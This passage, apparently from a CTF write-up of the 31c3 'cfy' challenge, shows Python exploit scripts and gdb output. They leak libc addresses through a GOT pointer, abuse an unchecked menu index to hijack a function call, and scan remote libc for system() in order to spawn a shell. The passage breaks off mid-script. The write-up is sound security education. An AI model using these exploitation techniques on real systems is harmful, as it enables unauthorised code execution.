</span><span class='line'>  4005e6: <span class="m">68</span> <span class="m">01</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span>           push   0x1
</span></code></pre></td></tr></table></div></figure>


<p>So the pointer to <code>printf</code> is located at <code>0x601020</code> in the binary. This script grabs that value via the &ldquo;parse from pointer&rdquo; option:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="c">#!/usr/bin/python</span>
</span><span class='line'>
</span><span class='line'><span class="kn">import</span> <span class="nn">struct</span>
</span><span class='line'><span class="kn">import</span> <span class="nn">time</span>
</span><span class='line'><span class="kn">import</span> <span class="nn">socket</span>
</span><span class='line'><span class="n">s</span><span class="o">=</span><span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="s">&#39;188.40.18.73&#39;</span><span class="p">,</span> <span class="mi">3313</span><span class="p">))</span>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'><span class="k">def</span> <span class="nf">p</span><span class="p">(</span><span class="n">x</span><span class="p">):</span>
</span><span class='line'>  <span class="k">return</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s">&quot;L&quot;</span><span class="p">,</span> <span class="n">x</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="n">addr</span> <span class="o">=</span> <span class="mh">0x601020</span>
</span><span class='line'>
</span><span class='line'><span class="n">payload</span> <span class="o">=</span> <span class="s">&quot;&quot;</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="s">&quot;2</span><span class="se">\n</span><span class="s">&quot;</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="n">addr</span><span class="p">)</span>  <span class="c"># printf</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="s">&quot;</span><span class="se">\n</span><span class="s">&quot;</span>
</span><span class='line'>
</span><span class='line'><span class="k">print</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1000</span><span class="p">)</span>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span><span class='line'><span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.5</span><span class="p">)</span>
</span><span class='line'><span class="k">print</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1000</span><span class="p">)</span>
</span></code></pre></td></tr></table></div></figure>


<p>Which gives us the output:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>bas@tritonal:~/tmp/31c3/cfy<span class="nv">$ </span>python read.py
</span><span class='line'>What <span class="k">do</span> you want to <span class="k">do</span>?
</span><span class='line'>0<span class="o">)</span> parse from hex
</span><span class='line'>1<span class="o">)</span> parse from dec
</span><span class='line'>2<span class="o">)</span> parse from pointer
</span><span class='line'>3<span class="o">)</span> quit
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>Please enter your number: dec: 140512731112416
</span><span class='line'>hex: 0x7fcbab6ca3e0
</span><span class='line'>
</span><span class='line'>What <span class="k">do</span> you want to <span class="k">do</span>?
</span><span class='line'>0<span class="o">)</span> parse from hex
</span><span class='line'>1<span class="o">)</span> parse from dec
</span><span class='line'>2<span class="o">)</span> parse from pointer
</span><span class='line'>3<span class="o">)</span> quit
</span></code></pre></td></tr></table></div></figure>


<p>Unfortunately, running the python script again shows a different address for <code>printf</code>. This means that ASLR is enabled. Furthermore, I didn&rsquo;t know what version of <code>libc</code> was running!</p>

<p>I turned my attention to gaining code execution. This was more trivial, although it wasn&rsquo;t a straight-forward buffer overflow. The binary asks the user for a choice. That choice is converted from a string to an int. From this int, the binary looks up the relevant code to handle the request:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>  4008af: <span class="m">48</span> c1 e0 <span class="m">04</span>           shl    rax,0x4         <span class="p">;</span> multiply value by 16
</span><span class='line'>  4008b3: <span class="m">48</span> <span class="m">05</span> <span class="m">80</span> <span class="m">10</span> <span class="m">60</span> <span class="m">00</span>     add    rax,0x601080    <span class="p">;</span> address of parsers, see below
</span><span class='line'>  4008b9: <span class="m">48</span> 8b <span class="m">00</span>              mov    rax,QWORD PTR <span class="o">[</span>rax<span class="o">]</span>
</span><span class='line'>  4008bc: bf e0 <span class="m">10</span> <span class="m">60</span> <span class="m">00</span>        mov    edi,0x6010e0    <span class="p">;</span> address of buf, see below
</span><span class='line'>  4008c1: ff d0                 call   rax             <span class="p">;</span> gain code <span class="nb">exec </span>here!
</span></code></pre></td></tr></table></div></figure>


<p>There is no check performed on the value in <code>rax</code>. If we pass in a normal value, like <code>2</code>, the binary fetches the corresponding parser here:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>gdb-peda<span class="nv">$ </span>p parsers
</span><span class='line'><span class="nv">$1</span> <span class="o">=</span> <span class="o">{</span> <span class="o">{</span>
</span><span class='line'>    <span class="nv">fn</span> <span class="o">=</span> 0x40073d &lt;from_hex&gt;,
</span><span class='line'>    <span class="nv">desc</span> <span class="o">=</span> 0x4009b4 <span class="s2">&quot;parse from hex&quot;</span>
</span><span class='line'>  <span class="o">}</span>, <span class="o">{</span>
</span><span class='line'>    <span class="nv">fn</span> <span class="o">=</span> 0x400761 &lt;from_dec&gt;,
</span><span class='line'>    <span class="nv">desc</span> <span class="o">=</span> 0x4009c3 <span class="s2">&quot;parse from dec&quot;</span>
</span><span class='line'>  <span class="o">}</span>, <span class="o">{</span>
</span><span class='line'>    <span class="nv">fn</span> <span class="o">=</span> 0x400785 &lt;from_ptr&gt;,
</span><span class='line'>    <span class="nv">desc</span> <span class="o">=</span> 0x4009d2 <span class="s2">&quot;parse from pointer&quot;</span>
</span><span class='line'>  <span class="o">}</span> <span class="o">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>But look here: <code>buf</code> is almost right behind <code>parsers</code>:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>gdb-peda<span class="nv">$ </span>x/40wx parsers
</span><span class='line'>0x601080 &lt;parsers&gt;:             0x0040073d  0x00000000  0x004009b4  0x00000000
</span><span class='line'>0x601090 &lt;parsers+16&gt;:          0x00400761  0x00000000  0x004009c3  0x00000000
</span><span class='line'>0x6010a0 &lt;parsers+32&gt;:          0x00400785  0x00000000  0x004009d2  0x00000000
</span><span class='line'>0x6010b0:                       0x00000000  0x00000000  0x00000000  0x00000000
</span><span class='line'>0x6010c0 &lt;stdout@@GLIBC_2.2.5&gt;: 0xf7dd77a0  0x00007fff  0xf7dd76c0  0x00007fff
</span><span class='line'>0x6010d0 &lt;completed.6972&gt;:      0x00000000  0x00000000  0x00000000  0x00000000
</span><span class='line'>0x6010e0 &lt;buf&gt;:                 0x00000000  0x00000000  0x00000000  0x00000000
</span><span class='line'>0x6010f0 &lt;buf+16&gt;:              0x00000000  0x00000000  0x00000000  0x00000000
</span><span class='line'>0x601100 &lt;buf+32&gt;:              0x00000000  0x00000000  0x00000000  0x00000000
</span><span class='line'>0x601110 &lt;buf+48&gt;:              0x00000000  0x00000000  0x00000000  0x00000000
</span></code></pre></td></tr></table></div></figure>


<p>If we somehow load <code>buf</code> with pointers to code we want to execute, then pass in a large value at the prompt, the code will fetch the parser address from the <code>buf</code> section and we have control over execution:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>gdb-peda<span class="nv">$ </span>r
</span><span class='line'>What <span class="k">do</span> you want to <span class="k">do</span>?
</span><span class='line'>0<span class="o">)</span> parse from hex
</span><span class='line'>1<span class="o">)</span> parse from dec
</span><span class='line'>2<span class="o">)</span> parse from pointer
</span><span class='line'>3<span class="o">)</span> quit
</span><span class='line'>7 <span class="c"># give bigger number!</span>
</span><span class='line'>
</span><span class='line'>Please enter your number: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
</span><span class='line'>
</span><span class='line'>Program received signal SIGSEGV, Segmentation fault.
</span><span class='line'><span class="o">[</span>----------------------------------registers-----------------------------------<span class="o">]</span>
</span><span class='line'>RAX: 0x6161616161616161 <span class="o">(</span><span class="s1">&#39;aaaaaaaa&#39;</span><span class="o">)</span>
</span><span class='line'>RBX: 0x0
</span><span class='line'>RCX: 0xfbad2288
</span><span class='line'>RDX: 0x6010e0 <span class="o">(</span><span class="s1">&#39;a&#39;</span> &lt;repeats <span class="m">52</span> <span class="nb">times</span>&gt;, <span class="s2">&quot;\n&quot;</span><span class="o">)</span>
</span><span class='line'>RSI: 0x7ffff7ff7035 --&gt; 0x0
</span><span class='line'>RDI: 0x6010e0 <span class="o">(</span><span class="s1">&#39;a&#39;</span> &lt;repeats <span class="m">52</span> <span class="nb">times</span>&gt;, <span class="s2">&quot;\n&quot;</span><span class="o">)</span>
</span><span class='line'>RBP: 0x7fffffffe4b0 --&gt; 0x0
</span><span class='line'>RSP: 0x7fffffffe4a0 --&gt; 0x7ffffe590
</span><span class='line'>...snip...
</span><span class='line'><span class="o">[</span>-------------------------------------code-------------------------------------<span class="o">]</span>
</span><span class='line'>   0x4008b3 &lt;main+167&gt;: add    rax,0x601080
</span><span class='line'>   0x4008b9 &lt;main+173&gt;: mov    rax,QWORD PTR <span class="o">[</span>rax<span class="o">]</span>
</span><span class='line'>   0x4008bc &lt;main+176&gt;: mov    edi,0x6010e0
</span><span class='line'><span class="o">=</span>&gt; 0x4008c1 &lt;main+181&gt;: call   rax
</span><span class='line'>   0x4008c3 &lt;main+183&gt;: mov    QWORD PTR <span class="o">[</span>rbp-0x8<span class="o">]</span>,rax
</span><span class='line'>   0x4008c7 &lt;main+187&gt;: mov    rax,QWORD PTR <span class="o">[</span>rbp-0x8<span class="o">]</span>
</span><span class='line'>   0x4008cb &lt;main+191&gt;: mov    rsi,rax
</span><span class='line'>   0x4008ce &lt;main+194&gt;: mov    edi,0x400a3d
</span><span class='line'>Guessed arguments:
</span><span class='line'>arg<span class="o">[</span>0<span class="o">]</span>: 0x6010e0 <span class="o">(</span><span class="s1">&#39;a&#39;</span> &lt;repeats <span class="m">52</span> <span class="nb">times</span>&gt;, <span class="s2">&quot;\n&quot;</span><span class="o">)</span>
</span><span class='line'>..snip...
</span><span class='line'>Legend: code, data, rodata, value
</span><span class='line'>Stopped reason: SIGSEGV
</span><span class='line'>0x00000000004008c1 in main <span class="o">()</span>
</span></code></pre></td></tr></table></div></figure>


<p>Excellent. Now what pointer should we store in <code>buf</code>? I couldn&rsquo;t make a ROP chain, for I had no control over the stack. The obvious thing to do was to return to <code>system()</code> with <code>/bin/sh</code> as argument. But where was <code>system()</code> located?</p>

<p>I had no idea what <code>libc</code> version was running. I did have an arbitrary read primitive though. I had downloaded <code>libc-2.19</code> and from the addresses of <code>printf</code> and <code>puts</code> (both available in the GOT) I deduced that this <em>wasn&rsquo;t</em> the correct version. However, I decided to scan the remote binary&rsquo;s libc for signature bytes of <code>system()</code>. I assumed it started with these bytes:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>bas@tritonal:~/tmp/31c3/cfy<span class="nv">$ </span>gdb ./libc-2.19.so
</span><span class='line'>GNU gdb <span class="o">(</span>GDB<span class="o">)</span> 7.4.1-debian
</span><span class='line'>...snip...
</span><span class='line'>gdb-peda<span class="nv">$ </span>x/8b system
</span><span class='line'>0x46530 &lt;system&gt;:   0x48    0x85    0xff    0x74    0xb 0xe9    0x26    0xfb
</span></code></pre></td></tr></table></div></figure>


<p>So I wrote a small scanner in python. This scanner will dump bytes from libc, searching for <code>ff85</code> in the output.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="c">#!/usr/bin/python</span>
</span><span class='line'>
</span><span class='line'><span class="kn">import</span> <span class="nn">struct</span><span class="o">,</span> <span class="nn">time</span><span class="o">,</span> <span class="nn">re</span>
</span><span class='line'>
</span><span class='line'><span class="k">def</span> <span class="nf">p</span><span class="p">(</span><span class="n">x</span><span class="p">):</span>
</span><span class='line'>  <span class="k">return</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s">&quot;L&quot;</span><span class="p">,</span> <span class="n">x</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="n">payload</span> <span class="o">=</span> <span class="s">&quot;&quot;</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="s">&quot;2</span><span class="se">\n</span><span class="s">&quot;</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x601020</span><span class="p">)</span> <span class="c"># printf</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="s">&quot;</span><span class="se">\n</span><span class="s">&quot;</span>
</span><span class='line'>
</span><span class='line'><span class="kn">import</span> <span class="nn">socket</span>
</span><span class='line'><span class="n">s</span><span class="o">=</span><span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="s">&#39;188.40.18.73&#39;</span><span class="p">,</span> <span class="mi">3313</span><span class="p">))</span>
</span><span class='line'>
</span><span class='line'><span class="k">print</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1025</span><span class="p">)</span>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span><span class='line'><span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">1.5</span><span class="p">)</span>
</span><span class='line'><span class="n">data</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1000</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="n">PRINTF</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1</span>
</span><span class='line'><span class="k">print</span> <span class="n">data</span>
</span><span class='line'><span class="n">m</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="s">r&#39;hex: (.*)&#39;</span><span class="p">,</span> <span class="n">data</span><span class="p">)</span>
</span><span class='line'><span class="k">if</span> <span class="n">m</span><span class="p">:</span>
</span><span class='line'>  <span class="n">PRINTF</span> <span class="o">=</span> <span class="n">m</span><span class="o">.</span><span class="n">group</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="n">OFFSET</span><span class="o">=</span><span class="mi">63580</span>    <span class="c"># guesstimated from real libc</span>
</span><span class='line'><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">5000</span><span class="p">):</span>
</span><span class='line'>  <span class="n">payload</span> <span class="o">=</span> <span class="s">&quot;&quot;</span>
</span><span class='line'>  <span class="n">payload</span> <span class="o">+=</span> <span class="s">&quot;2</span><span class="se">\n</span><span class="s">&quot;</span>
</span><span class='line'>  <span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">PRINTF</span><span class="p">,</span> <span class="mi">16</span><span class="p">)</span><span class="o">-</span><span class="n">OFFSET</span><span class="o">-</span><span class="n">i</span><span class="p">)</span>
</span><span class='line'>  <span class="n">payload</span> <span class="o">+=</span> <span class="s">&quot;</span><span class="se">\n</span><span class="s">&quot;</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">data</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">200</span><span class="p">)</span>
</span><span class='line'>  <span class="k">print</span> <span class="n">data</span>
</span><span class='line'>  <span class="k">print</span> <span class="n">i</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">if</span> <span class="s">&#39;ff85&#39;</span> <span class="ow">in</span> <span class="n">data</span><span class="p">:</span> <span class="c"># part of test rdi, rdi</span>
</span><span class='line'>          <span class="k">print</span> <span class="s">&quot;[!] found possible offset for system(): printf-</span><span class="si">%d</span><span class="s">&quot;</span> <span class="o">%</span> <span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">PRINTF</span><span class="p">,</span><span class="mi">16</span><span class="p">)</span><span class="o">-</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">PRINTF</span><span class="p">,</span> <span class="mi">16</span><span class="p">)</span><span class="o">-</span><span class="n">OFFSET</span><span class="o">-</span><span class="n">i</span><span class="p">))</span>
</span><span class='line'>          <span class="k">print</span> <span class="s">&quot;[!] system @ </span><span class="si">%s</span><span class="s">&quot;</span> <span class="o">%</span> <span class="nb">hex</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">PRINTF</span><span class="p">,</span> <span class="mi">16</span><span class="p">)</span><span class="o">-</span><span class="n">OFFSET</span><span class="o">-</span><span class="n">i</span><span class="p">)</span>
</span><span class='line'>          <span class="nb">raw_input</span><span class="p">()</span>
</span></code></pre></td></tr></table></div></figure>


<p>It gave a lot of possible addresses, and once I thought I had <code>system()</code> but it was the wrong. I chose a reasonble offset to start from (based on libc 2.19) and ran the script. I stumbled upon the following output:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="o">...</span><span class="n">snip</span><span class="o">...</span>
</span><span class='line'><span class="mi">85</span>
</span><span class='line'><span class="p">[</span><span class="err">!</span><span class="p">]</span> <span class="n">found</span> <span class="n">possible</span> <span class="n">offset</span> <span class="k">for</span> <span class="n">system</span><span class="p">():</span> <span class="n">printf</span><span class="o">-</span><span class="mi">63665</span>
</span><span class='line'><span class="p">[</span><span class="err">!</span><span class="p">]</span> <span class="n">system</span> <span class="err">@</span> <span class="mh">0x7f4df0086b2f</span>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'><span class="n">Please</span> <span class="n">enter</span> <span class="n">your</span> <span class="n">number</span><span class="p">:</span> <span class="n">dec</span><span class="p">:</span> <span class="mi">2803784840145881088</span>
</span><span class='line'><span class="nb">hex</span><span class="p">:</span> <span class="mh">0x26e90b74ff854800</span>
</span><span class='line'>
</span><span class='line'><span class="n">What</span> <span class="n">do</span> <span class="n">you</span> <span class="n">want</span> <span class="n">to</span> <span class="n">do</span><span class="err">?</span>
</span><span class='line'><span class="mi">0</span><span class="p">)</span> <span class="n">parse</span> <span class="kn">from</span> <span class="nn">hex</span>
</span><span class='line'><span class="mi">1</span><span class="p">)</span> <span class="n">parse</span> <span class="kn">from</span> <span class="nn">dec</span>
</span><span class='line'><span class="mi">2</span><span class="p">)</span> <span class="n">parse</span> <span class="kn">from</span> <span class="nn">pointer</span>
</span><span class='line'><span class="mi">3</span><span class="p">)</span> <span class="n">quit</span>
</span><span class='line'>
</span><span class='line'><span class="mi">86</span>
</span><span class='line'><span class="p">[</span><span class="err">!</span><span class="p">]</span> <span class="n">found</span> <span class="n">possible</span> <span class="n">offset</span> <span class="k">for</span> <span class="n">system</span><span class="p">():</span> <span class="n">printf</span><span class="o">-</span><span class="mi">63666</span>
</span><span class='line'><span class="p">[</span><span class="err">!</span><span class="p">]</span> <span class="n">system</span> <span class="err">@</span> <span class="mh">0x7f4df0086b2e</span>
</span></code></pre></td></tr></table></div></figure>


<p>At <code>printf-63665</code>, libc indeed has the first few bytes of <code>system()</code>. It started with a <code>00</code> byte, so I decreased the value by one and plugged that value into a script.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="c">#!/usr/bin/python</span>
</span><span class='line'>
</span><span class='line'><span class="kn">import</span> <span class="nn">struct</span><span class="o">,</span> <span class="nn">time</span><span class="o">,</span> <span class="nn">re</span><span class="o">,</span> <span class="nn">telnetlib</span><span class="o">,</span> <span class="nn">socket</span>
</span><span class='line'>
</span><span class='line'><span class="k">def</span> <span class="nf">p</span><span class="p">(</span><span class="n">x</span><span class="p">):</span>
</span><span class='line'>  <span class="k">return</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s">&quot;L&quot;</span><span class="p">,</span> <span class="n">x</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="c"># leak printf address in libc via GOT pointer</span>
</span><span class='line'><span class="n">payload</span> <span class="o">=</span> <span class="s">&quot;&quot;</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="s">&quot;2</span><span class="se">\n</span><span class="s">&quot;</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x601020</span><span class="p">)</span> <span class="c"># printf@plt</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="s">&quot;</span><span class="se">\n</span><span class="s">&quot;</span>
</span><span class='line'>
</span><span class='line'><span class="n">s</span><span class="o">=</span><span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="s">&#39;188.40.18.73&#39;</span><span class="p">,</span> <span class="mi">3313</span><span class="p">))</span>
</span><span class='line'>
</span><span class='line'><span class="k">print</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1025</span><span class="p">)</span>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span><span class='line'><span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.5</span><span class="p">)</span>
</span><span class='line'><span class="n">data</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1000</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="n">PRINTF</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1</span>
</span><span class='line'><span class="k">print</span> <span class="n">data</span>
